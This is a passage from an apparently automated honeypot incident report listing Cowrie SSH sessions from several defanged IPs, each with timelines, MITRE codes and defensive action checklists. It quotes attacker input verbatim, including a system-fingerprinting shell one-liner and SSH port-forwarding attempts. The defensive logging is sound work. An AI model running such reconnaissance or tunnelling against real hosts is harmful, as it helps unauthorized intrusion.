| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:07:07` | `cowrie.session.connect` |
| `2026-08-29 14:07:08` | `cowrie.client.version` |
| `2026-08-29 14:07:08` | `cowrie.client.kex` |
| `2026-08-29 14:07:13` | `cowrie.login.success` |
| `2026-08-29 14:07:16` | `cowrie.session.params` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.success` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:16` | `cowrie.command.input` |
| `2026-08-29 14:07:18` | `cowrie.log.closed` |
| `2026-08-29 14:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eed4571eeb3

| Field | Detail |
|---|---|
| **Source IP** | `182.76.71[.]82` |
| **First Seen** | 2026-08-29 14:07 |
| **Last Seen** | 2026-08-29 14:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:07:18` | `cowrie.session.connect` |
| `2026-08-29 14:07:19` | `cowrie.client.version` |
| `2026-08-29 14:07:19` | `cowrie.client.kex` |
| `2026-08-29 14:07:21` | `cowrie.login.success` |
| `2026-08-29 14:07:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.71[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.76.71[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683d7faac3b7

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:07 |
| **Last Seen** | 2026-08-29 14:08 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:07:50` | `cowrie.session.connect` |
| `2026-08-29 14:07:50` | `cowrie.login.success` |
| `2026-08-29 14:07:51` | `cowrie.login.success` |
| `2026-08-29 14:07:52` | `cowrie.session.params` |
| `2026-08-29 14:07:52` | `cowrie.command.input` |
| `2026-08-29 14:07:52` | `cowrie.command.failed` |
| `2026-08-29 14:07:53` | `cowrie.command.input` |
| `2026-08-29 14:07:53` | `cowrie.command.failed` |
| `2026-08-29 14:07:53` | `cowrie.command.input` |
| `2026-08-29 14:07:53` | `cowrie.command.input` |
| `2026-08-29 14:07:53` | `cowrie.command.failed` |
| `2026-08-29 14:07:53` | `cowrie.command.failed` |
| `2026-08-29 14:08:24` | `cowrie.log.closed` |
| `2026-08-29 14:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b53233508d9

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:08 |
| **Last Seen** | 2026-08-29 14:08 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:08:24` | `cowrie.session.connect` |
| `2026-08-29 14:08:25` | `cowrie.login.success` |
| `2026-08-29 14:08:26` | `cowrie.session.params` |
| `2026-08-29 14:08:26` | `cowrie.command.input` |
| `2026-08-29 14:08:26` | `cowrie.command.failed` |
| `2026-08-29 14:08:26` | `cowrie.command.input` |
| `2026-08-29 14:08:26` | `cowrie.command.failed` |
| `2026-08-29 14:08:27` | `cowrie.command.input` |
| `2026-08-29 14:08:27` | `cowrie.command.failed` |
| `2026-08-29 14:08:27` | `cowrie.command.input` |
| `2026-08-29 14:08:27` | `cowrie.command.failed` |
| `2026-08-29 14:08:27` | `cowrie.command.input` |
| `2026-08-29 14:08:27` | `cowrie.command.input` |
| `2026-08-29 14:08:27` | `cowrie.command.failed` |
| `2026-08-29 14:08:27` | `cowrie.command.failed` |
| `2026-08-29 14:08:58` | `cowrie.log.closed` |
| `2026-08-29 14:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ef61ebdf04

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:08 |
| **Last Seen** | 2026-08-29 14:09 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:08:51` | `cowrie.session.connect` |
| `2026-08-29 14:08:52` | `cowrie.client.version` |
| `2026-08-29 14:08:52` | `cowrie.client.kex` |
| `2026-08-29 14:08:58` | `cowrie.login.success` |
| `2026-08-29 14:09:02` | `cowrie.session.params` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.success` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:02` | `cowrie.command.input` |
| `2026-08-29 14:09:04` | `cowrie.log.closed` |
| `2026-08-29 14:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19896ddfcc54

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:08 |
| **Last Seen** | 2026-08-29 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:08:58` | `cowrie.session.connect` |
| `2026-08-29 14:08:58` | `cowrie.client.version` |
| `2026-08-29 14:08:58` | `cowrie.client.kex` |
| `2026-08-29 14:09:00` | `cowrie.login.success` |
| `2026-08-29 14:09:00` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:09:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:09:00` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4e1c96fdad

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:08 |
| **Last Seen** | 2026-08-29 14:09 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:08:58` | `cowrie.session.connect` |
| `2026-08-29 14:08:59` | `cowrie.login.success` |
| `2026-08-29 14:09:00` | `cowrie.session.params` |
| `2026-08-29 14:09:00` | `cowrie.command.input` |
| `2026-08-29 14:09:00` | `cowrie.command.failed` |
| `2026-08-29 14:09:00` | `cowrie.command.input` |
| `2026-08-29 14:09:00` | `cowrie.command.failed` |
| `2026-08-29 14:09:00` | `cowrie.command.input` |
| `2026-08-29 14:09:00` | `cowrie.command.failed` |
| `2026-08-29 14:09:01` | `cowrie.command.input` |
| `2026-08-29 14:09:01` | `cowrie.command.failed` |
| `2026-08-29 14:09:01` | `cowrie.command.input` |
| `2026-08-29 14:09:01` | `cowrie.command.input` |
| `2026-08-29 14:09:01` | `cowrie.command.failed` |
| `2026-08-29 14:09:01` | `cowrie.command.failed` |
| `2026-08-29 14:09:32` | `cowrie.log.closed` |
| `2026-08-29 14:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4e20ae124c

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:09 |
| **Last Seen** | 2026-08-29 14:10 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:09:32` | `cowrie.session.connect` |
| `2026-08-29 14:09:33` | `cowrie.login.success` |
| `2026-08-29 14:09:34` | `cowrie.session.params` |
| `2026-08-29 14:09:34` | `cowrie.command.input` |
| `2026-08-29 14:09:34` | `cowrie.command.failed` |
| `2026-08-29 14:09:35` | `cowrie.command.input` |
| `2026-08-29 14:09:35` | `cowrie.command.failed` |
| `2026-08-29 14:09:35` | `cowrie.command.input` |
| `2026-08-29 14:09:35` | `cowrie.command.failed` |
| `2026-08-29 14:09:36` | `cowrie.command.input` |
| `2026-08-29 14:09:36` | `cowrie.command.failed` |
| `2026-08-29 14:09:36` | `cowrie.command.input` |
| `2026-08-29 14:09:36` | `cowrie.command.input` |
| `2026-08-29 14:09:36` | `cowrie.command.failed` |
| `2026-08-29 14:09:36` | `cowrie.command.failed` |
| `2026-08-29 14:10:07` | `cowrie.log.closed` |
| `2026-08-29 14:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb86212a0c0e

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:10 |
| **Last Seen** | 2026-08-29 14:10 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:10:07` | `cowrie.session.connect` |
| `2026-08-29 14:10:08` | `cowrie.login.success` |
| `2026-08-29 14:10:09` | `cowrie.session.params` |
| `2026-08-29 14:10:09` | `cowrie.command.input` |
| `2026-08-29 14:10:09` | `cowrie.command.failed` |
| `2026-08-29 14:10:10` | `cowrie.command.input` |
| `2026-08-29 14:10:10` | `cowrie.command.failed` |
| `2026-08-29 14:10:10` | `cowrie.command.input` |
| `2026-08-29 14:10:10` | `cowrie.command.failed` |
| `2026-08-29 14:10:10` | `cowrie.command.input` |
| `2026-08-29 14:10:10` | `cowrie.command.failed` |
| `2026-08-29 14:10:11` | `cowrie.command.input` |
| `2026-08-29 14:10:11` | `cowrie.command.input` |
| `2026-08-29 14:10:11` | `cowrie.command.failed` |
| `2026-08-29 14:10:11` | `cowrie.command.failed` |
| `2026-08-29 14:10:41` | `cowrie.log.closed` |
| `2026-08-29 14:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c95a47d11b4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:10 |
| **Last Seen** | 2026-08-29 14:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:10:39` | `cowrie.session.connect` |
| `2026-08-29 14:10:41` | `cowrie.client.version` |
| `2026-08-29 14:10:41` | `cowrie.client.kex` |
| `2026-08-29 14:10:46` | `cowrie.login.success` |
| `2026-08-29 14:10:49` | `cowrie.session.params` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.success` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:49` | `cowrie.command.input` |
| `2026-08-29 14:10:51` | `cowrie.log.closed` |
| `2026-08-29 14:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7365617f910b

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:10 |
| **Last Seen** | 2026-08-29 14:11 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:10:41` | `cowrie.session.connect` |
| `2026-08-29 14:10:42` | `cowrie.login.failed` |
| `2026-08-29 14:10:43` | `cowrie.login.success` |
| `2026-08-29 14:10:44` | `cowrie.session.params` |
| `2026-08-29 14:10:44` | `cowrie.command.input` |
| `2026-08-29 14:10:44` | `cowrie.command.failed` |
| `2026-08-29 14:10:45` | `cowrie.command.input` |
| `2026-08-29 14:10:45` | `cowrie.command.failed` |
| `2026-08-29 14:10:45` | `cowrie.command.input` |
| `2026-08-29 14:10:45` | `cowrie.command.input` |
| `2026-08-29 14:10:45` | `cowrie.command.failed` |
| `2026-08-29 14:10:45` | `cowrie.command.failed` |
| `2026-08-29 14:11:16` | `cowrie.log.closed` |
| `2026-08-29 14:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9214413274c9

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:11 |
| **Last Seen** | 2026-08-29 14:11 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:11:16` | `cowrie.session.connect` |
| `2026-08-29 14:11:17` | `cowrie.login.success` |
| `2026-08-29 14:11:18` | `cowrie.session.params` |
| `2026-08-29 14:11:18` | `cowrie.command.input` |
| `2026-08-29 14:11:18` | `cowrie.command.failed` |
| `2026-08-29 14:11:18` | `cowrie.command.input` |
| `2026-08-29 14:11:18` | `cowrie.command.failed` |
| `2026-08-29 14:11:19` | `cowrie.command.input` |
| `2026-08-29 14:11:19` | `cowrie.command.failed` |
| `2026-08-29 14:11:19` | `cowrie.command.input` |
| `2026-08-29 14:11:19` | `cowrie.command.failed` |
| `2026-08-29 14:11:19` | `cowrie.command.input` |
| `2026-08-29 14:11:19` | `cowrie.command.input` |
| `2026-08-29 14:11:19` | `cowrie.command.failed` |
| `2026-08-29 14:11:19` | `cowrie.command.failed` |
| `2026-08-29 14:11:50` | `cowrie.log.closed` |
| `2026-08-29 14:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72cb30fbce4a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:11 |
| **Last Seen** | 2026-08-29 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:11:25` | `cowrie.session.connect` |
| `2026-08-29 14:11:25` | `cowrie.client.version` |
| `2026-08-29 14:11:25` | `cowrie.client.kex` |
| `2026-08-29 14:11:26` | `cowrie.login.success` |
| `2026-08-29 14:11:26` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:11:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:11:26` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf00cf61fb6

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:11 |
| **Last Seen** | 2026-08-29 14:12 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:11:50` | `cowrie.session.connect` |
| `2026-08-29 14:11:51` | `cowrie.login.success` |
| `2026-08-29 14:11:52` | `cowrie.login.success` |
| `2026-08-29 14:11:53` | `cowrie.session.params` |
| `2026-08-29 14:11:53` | `cowrie.command.input` |
| `2026-08-29 14:11:53` | `cowrie.command.failed` |
| `2026-08-29 14:11:54` | `cowrie.command.input` |
| `2026-08-29 14:11:54` | `cowrie.command.failed` |
| `2026-08-29 14:11:54` | `cowrie.command.input` |
| `2026-08-29 14:11:54` | `cowrie.command.input` |
| `2026-08-29 14:11:54` | `cowrie.command.failed` |
| `2026-08-29 14:11:54` | `cowrie.command.failed` |
| `2026-08-29 14:12:24` | `cowrie.log.closed` |
| `2026-08-29 14:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d886c1f796b8

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:12 |
| **Last Seen** | 2026-08-29 14:12 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:12:24` | `cowrie.session.connect` |
| `2026-08-29 14:12:25` | `cowrie.login.success` |
| `2026-08-29 14:12:26` | `cowrie.session.params` |
| `2026-08-29 14:12:26` | `cowrie.command.input` |
| `2026-08-29 14:12:26` | `cowrie.command.failed` |
| `2026-08-29 14:12:26` | `cowrie.command.input` |
| `2026-08-29 14:12:26` | `cowrie.command.failed` |
| `2026-08-29 14:12:27` | `cowrie.command.input` |
| `2026-08-29 14:12:27` | `cowrie.command.failed` |
| `2026-08-29 14:12:27` | `cowrie.command.input` |
| `2026-08-29 14:12:27` | `cowrie.command.failed` |
| `2026-08-29 14:12:27` | `cowrie.command.input` |
| `2026-08-29 14:12:27` | `cowrie.command.input` |
| `2026-08-29 14:12:27` | `cowrie.command.failed` |
| `2026-08-29 14:12:27` | `cowrie.command.failed` |
| `2026-08-29 14:12:58` | `cowrie.log.closed` |
| `2026-08-29 14:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95b293892ef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:12 |
| **Last Seen** | 2026-08-29 14:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:12:27` | `cowrie.session.connect` |
| `2026-08-29 14:12:28` | `cowrie.client.version` |
| `2026-08-29 14:12:28` | `cowrie.client.kex` |
| `2026-08-29 14:12:34` | `cowrie.login.success` |
| `2026-08-29 14:12:38` | `cowrie.session.params` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.success` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:38` | `cowrie.command.input` |
| `2026-08-29 14:12:40` | `cowrie.log.closed` |
| `2026-08-29 14:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09acc05e5f3e

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-08-29 14:12 |
| **Last Seen** | 2026-08-29 14:13 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:12:58` | `cowrie.session.connect` |
| `2026-08-29 14:12:59` | `cowrie.login.success` |
| `2026-08-29 14:13:00` | `cowrie.session.params` |
| `2026-08-29 14:13:00` | `cowrie.command.input` |
| `2026-08-29 14:13:00` | `cowrie.command.failed` |
| `2026-08-29 14:13:01` | `cowrie.command.input` |
| `2026-08-29 14:13:01` | `cowrie.command.failed` |
| `2026-08-29 14:13:01` | `cowrie.command.input` |
| `2026-08-29 14:13:01` | `cowrie.command.failed` |
| `2026-08-29 14:13:02` | `cowrie.command.input` |
| `2026-08-29 14:13:02` | `cowrie.command.failed` |
| `2026-08-29 14:13:02` | `cowrie.command.input` |
| `2026-08-29 14:13:02` | `cowrie.command.input` |
| `2026-08-29 14:13:02` | `cowrie.command.failed` |
| `2026-08-29 14:13:02` | `cowrie.command.failed` |
| `2026-08-29 14:13:32` | `cowrie.log.closed` |
| `2026-08-29 14:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
